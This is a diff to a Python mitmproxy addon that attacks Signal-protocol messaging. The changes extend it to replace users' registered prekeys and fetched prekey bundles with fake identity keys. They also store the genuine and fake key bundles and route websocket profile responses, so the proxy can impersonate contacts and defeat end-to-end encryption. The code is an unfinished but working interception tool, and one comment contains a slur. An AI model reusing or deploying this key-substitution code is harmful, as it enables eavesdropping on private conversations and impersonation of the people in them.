@@ -3,7 +3,7 @@ from mitmproxy.http import HTTPFlow
 from dataclasses import dataclass
 from typing import Optional
 import logging
-from xepor import InterceptedAPI, RouteType, HTTPVerb
+from xepor import InterceptedAPI, RouteType, HTTPVerb, Router
 import json
 from signal_protocol import identity_key, curve, session_cipher, address, storage, state, helpers, address
 from base64 import b64decode, b64encode
@@ -64,8 +64,8 @@ class RegistrationInfo():
     pni : Optional[str] = None
     unidentifiedAccessKey: Optional[str] = None
 
-    aciData: KeyData
-    pniData: KeyData
+    aciData: KeyData = None
+    pniData: KeyData = None
     ######## Legitimate keys
     # aci_IdenKey: Optional[identity_key.IdentityKeyPair] = None
     # pni_IdenKey: Optional[identity_key.IdentityKeyPair] = None
@@ -145,10 +145,10 @@ def _v1_registration(flow: HTTPFlow):
                                                         fake_IdenKey= aci_fake_IdenKey,
                                                         fake_SignedPreKeys = fake_signed_pre_keys["aciSignedPreKey"],
                                                         fake_secret_SignedPreKeys = fake_secret_SignedPreKeys["aciSignedPreKeySecret"],
-                                                        fake_PreKeys = fake_signed_pre_keys["aciPreKey"],
-                                                        fake_secret_PreKeys = fake_secret_SignedPreKeys["aciPreKeySecret"],
-                                                        fake_pq_PreKeys = fake_signed_pre_keys["aciPqPreKey"],
-                                                        fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["aciPqPreKeySecret"],
+                                                        # fake_PreKeys = fake_signed_pre_keys["aciPreKey"],
+                                                        # fake_secret_PreKeys = fake_secret_SignedPreKeys["aciPreKeySecret"],
+                                                        # fake_pq_PreKeys = fake_signed_pre_keys["aciPqPreKey"],
+                                                        # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["aciPqPreKeySecret"],
                                                         fake_lastResortKey = fake_signed_pre_keys["aciPqLastResortPreKey"],
                                                         fake_secret_lastResortKey = fake_secret_SignedPreKeys["aciPqLastResortSecret"]
                                                     ),
@@ -159,10 +159,10 @@ def _v1_registration(flow: HTTPFlow):
                                                         fake_IdenKey= pni_fake_IdenKey,
                                                         fake_SignedPreKeys = fake_signed_pre_keys["pniSignedPreKey"],
                                                         fake_secret_SignedPreKeys = fake_secret_SignedPreKeys["pniSignedPreKeySecret"],
-                                                        fake_PreKeys = fake_signed_pre_keys["pniPreKey"],
-                                                        fake_secret_PreKeys = fake_secret_SignedPreKeys["pniPreKeySecret"],
-                                                        fake_pq_PreKeys = fake_signed_pre_keys["pniPqPreKey"],
-                                                        fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["pniPqPreKeySecret"],
+                                                        # fake_PreKeys = fake_signed_pre_keys["pniPreKey"],
+                                                        # fake_secret_PreKeys = fake_secret_SignedPreKeys["pniPreKeySecret"],
+                                                        # fake_pq_PreKeys = fake_signed_pre_keys["pniPqPreKey"],
+                                                        # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["pniPqPreKeySecret"],
                                                         fake_lastResortKey = fake_signed_pre_keys["pniPqLastResortPreKey"],
                                                         fake_secret_lastResortKey = fake_secret_SignedPreKeys["pniPqLastResortSecret"]
                                                     )
@@ -247,6 +247,8 @@ def _v2_keys(flow: HTTPFlow):
     address = flow.client_conn.address[0]
 
     ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
+    if not registration_info.get(address):
+        logging.error(f"Address {address} not found in registration_info. {registration_info}")
 
     key_data = registration_info[address].aciData if identity == "aci" else registration_info[address].pniData
 
@@ -273,8 +275,9 @@ def _v2_keys(flow: HTTPFlow):
 
     legit_bundle = LegitBundle.insert(
         type = identity,
-        aci = key_data.aci,
-        deviceId = 1,
+        aci = registration_info[address].aci,
+        deviceId = 1, # todo: shouldnt be static
+        IdenKey = key_data.IdenKey,
         SignedPreKey = key_data.SignedPreKey,
         PreKeys = key_data.PreKeys,
         kyberKeys = key_data.pq_PreKeys,
@@ -283,8 +286,8 @@ def _v2_keys(flow: HTTPFlow):
 
     mitm_bundle = MitMBundle.insert(
         type = identity,
-        aci = key_data.aci,
-        deviceId = 1,
+        aci = registration_info[address].aci,
+        deviceId = 1, # todo: shouldnt be static
         FakeIdenKey = key_data.fake_IdenKey, 
         FakeSignedPreKey = (key_data.fake_SignedPreKeys, key_data.fake_secret_SignedPreKeys),
         FakePrekeys = (key_data.fake_PreKeys, key_data.fake_secret_PreKeys),
@@ -387,7 +390,7 @@ def _v2_keys(flow: HTTPFlow):
     flow.request.content = json.dumps(req).encode()
 
 @api.route("/v2/keys/{identifier}/{device_id}", rtype = RouteType.RESPONSE, method = HTTPVerb.GET, allowed_statuses=[200])
-def v2_keys_identifier_device_id(flow, identifier, device_id):
+def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     #logging.exception((flow.response.content, identifier, device_id))
 
     resp = json.loads(flow.response.content)
@@ -402,7 +405,6 @@ def v2_keys_identifier_device_id(flow, identifier, device_id):
     for id, bundle in enumerate(resp["devices"]):
 
         # data should be uuid of Alice and the device id (in this case 1 is ok)
-
         fakeVictim = MitmUser(address.ProtocolAddress("1", 1))
 
         bob_registartion_id = bundle["registrationId"]
@@ -414,6 +416,8 @@ def v2_keys_identifier_device_id(flow, identifier, device_id):
         bob_signed_pre_key_public = base64.b64decode(bundle["signedPreKey"]["publicKey"])
         bob_pre_key_public = base64.b64decode(bundle["preKey"]["publicKey"])
 
+        device_id = bundle["deviceId"]
+
         bob_bundle = state.PreKeyBundle(
             bob_registartion_id,
             address.DeviceId(id),
@@ -421,7 +425,7 @@ def v2_keys_identifier_device_id(flow, identifier, device_id):
             state.SignedPreKeyId(1),
             PublicKey.deserialize(bob_signed_pre_key_public),
             base64.b64decode(bundle["signedPreKey"]["signature"] + "=="),
-            identity_key.IdentityKey(bob_identity_key_public),
+            IdentityKey(bob_identity_key_public),
         )
 
         bob_bundle = bob_bundle.with_kyber_pre_key(state.KyberPreKeyId(bob_kyber_pre_key_id),
@@ -429,24 +433,32 @@ def v2_keys_identifier_device_id(flow, identifier, device_id):
                                                bob_kyber_pre_key_signature)
         
         legit_bundle = LegitBundle.insert(
-            type = identity,
+            type = identity.lower(),
             aci = uuid,
             deviceId = device_id,
-            SignedPreKey = bob_signed_pre_key_public,
-            PreKeys = bob_pre_key_public,
-            kyberKeys = bob_kyber_pre_key_public,
-            lastResortKyber = bob_kyber_pre_key_public
+            IdenKey = base64.b64encode(bob_identity_key_public).decode("ascii"),
+            SignedPreKey = base64.b64encode(bob_signed_pre_key_public).decode("ascii"),
+            PreKeys = base64.b64encode(bob_pre_key_public).decode("ascii"),
+            kyberKeys = base64.b64encode(bob_kyber_pre_key_public).decode("ascii"),
+            lastResortKyber = base64.b64encode(bob_kyber_pre_key_public).decode("ascii")
         )
         legit_bundle.on_conflict_replace().execute()
-
         fakeVictim.process_pre_key_bundle(address.ProtocolAddress(uuid, id), bob_bundle)
 
     ############ Swap the prekeybundle TODO 
 
     for id, bundle in enumerate(resp["devices"]):
         # This should impersonate Bob's info 
-        fakeUser = MitmUser(address.ProtocolAddress(identifier, id))
+        identity_key = MitMBundle.select().where(MitMBundle.type == identity,
+                                                    MitMBundle.aci == uuid,
+                                                    MitMBundle.deviceId == device_id).first()
 
+        if not identity_key:
+            # todo create row
+            fakeUser = MitmUser(address = address.ProtocolAddress(uuid, id))
+        else:
+            fakeUser = MitmUser(address = address.ProtocolAddress(uuid, id), identity_key = identity_key.FakeIdenKey)
+        
         fakeBundle = fakeUser.pre_key_bundle.to_dict()
 
         logging.info(f"FAKE BUNDLE: {json.dumps(fakeBundle, indent=4)}")
@@ -474,11 +486,10 @@ def v2_keys_identifier_device_id(flow, identifier, device_id):
                 }
             ]
         }
-        
+    
     resp.update(fakeBundle_wire)
     conversation_session[(ip_address, identifier)] = (fakeUser, fakeVictim)
     flow.response.content = json.dumps(resp, sort_keys=True).encode()
-
 
 @api.ws_route("/v1/websocket/")
 def _v1_websocket(flow, msg):
@@ -496,6 +507,67 @@ def _v1_websocket(flow, msg):
 
     logging.warning(f"Websocket req with id {id} and path {path}")
 
+def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
+    logging.info(f"my profile: {identifier} {version} {credentialRequest}")
+    # raise RuntimeError(f"my profile: {identifier} {version} {credentialRequest}")
+
+def _v1_ws_profile_futut(flow, identifier, version):
+    logging.info(f"my profile: {identifier} {version}")
+    # raise RuntimeError(f"my profile: {identifier} {version}")
+
+
+
+def _v1_ws_profile(flow, identifier):
+    # message = flow.websocket.messages[-1]
+    logging.info(f"{identifier}")
+    try:
+        uuid_type, uuid = re.search(r"(PNI|ACI):([a-f0-9-]+)", identifier).groups()
+    except:
+        logging.exception(f"Invalid identifier {identifier}")
+        return
+    content = json.loads(flow.response.content)
+
+    logging.info(f"PROFILE: {content}")
+
+    #pni = User.get(MitMBundle.type == uuid_type, MitMBundle.aci == uuid)
+    logging.warning(f"id: {identifier, uuid_type, uuid}")
+
+    bundle = MitMBundle.select().where(MitMBundle.type == uuid_type, MitMBundle.aci == uuid).first()
+
+    logging.info(f"BUNDLE: {bundle}")
+
+    #content["identityKey"] = registration_info[flow.client_conn.address[0]].aci_fake_IdenKey.public_key.serialize()
+
+    flow.response.content = json.dumps(content).encode()
+
+from mitmproxy.http import Request, Response, HTTPFlow
+
+def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
+    ws_msg = WebSocketMessage()
+    ws_msg.ParseFromString(msg.content)
+    ws_msg = ws_msg.request if rtype == RouteType.REQUEST else ws_msg.response
+
+    f = HTTPFlow(client_conn=orig_flow.client_conn, server_conn=orig_flow.server_conn)
+    from mitmproxy.http import Headers
+
+    if rtype == RouteType.REQUEST:
+        # todo: handle headers
+        f.request = Request(host=orig_flow.request.host, port=orig_flow.request.port, scheme=ws_msg.scheme, path=ws_msg.path, headers=Headers(), content=ws_msg.body)
+    else:
+        # todo: handle headeers + reason
+        rp = Response(http_version=orig_flow.response.http_version, status_code=ws_msg.status, reason=b"id: ", headers=Headers(), content=ws_msg.body, trailers=None, timestamp_start=orig_flow.response.timestamp_start, timestamp_end=orig_flow.response.timestamp_end)
+        f.response = rp
+    return f
+
+
+ws_resp = Router()
+from parse import Parser
+
+ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}/{version}/{credentialRequest}"), HTTPVerb.ANY, _v1_ws_my_profile, None)
+ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut, None)
+ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)
+
+logging.warning(f"ROUTES: {ws_resp.routes}")
 
 
 @api.ws_route("/v1/websocket/", rtype=RouteType.RESPONSE)
@@ -515,16 +587,23 @@ def _v1_websocket_resp(flow, msg):
     path = websocket_open_state[id].request.path
 
     websocket_open_state[id].response = ws_msg
-
-    if "/v1/profile/" in path: # TODO: fix this when xepor is not retarded
-        identifier, uuid = re.search(r"/v1/profile/(PNI|ACI):([a-f0-9-]+)", path).groups()
-        content = json.loads(ws_msg.body)
-
-        pni = User.get(MitMBundle.type == uuid)
-
-        content["identityKey"] = registration_info[flow.client_conn.address[0]].aci_fake_IdenKey.public_key.serialize()
-
     logging.warning(f"Websocket resp with id {id} and path {path}")
+
+
+    f = decap_ws_msg(flow, msg, RouteType.RESPONSE)
+    handler, params, _ = ws_resp.find_handler(HOST_HTTPBIN, path) # todo: HARDCODING IS BAD, onii-chan
+    logging.warning(f"HANDLER: {handler}, PARAMS: {params} -- {HOST_HTTPBIN} / {path}")
+    if handler:
+        handler(f,  *params.fixed, **params.named)
+
+    # if "/v1/profile/" in path: # TODO: fix this when xepor is not retarded
+    #     identifier, uuid = re.search(r"/v1/profile/(PNI|ACI):([a-f0-9-]+)", path).groups()
+    #     content = json.loads(ws_msg.body)
+
+    #     pni = User.get(MitMBundle.type == uuid)
+
+    #     content["identityKey"] = registration_info[flow.client_conn.address[0]].aci_fake_IdenKey.public_key.serialize()
+
 
 
 
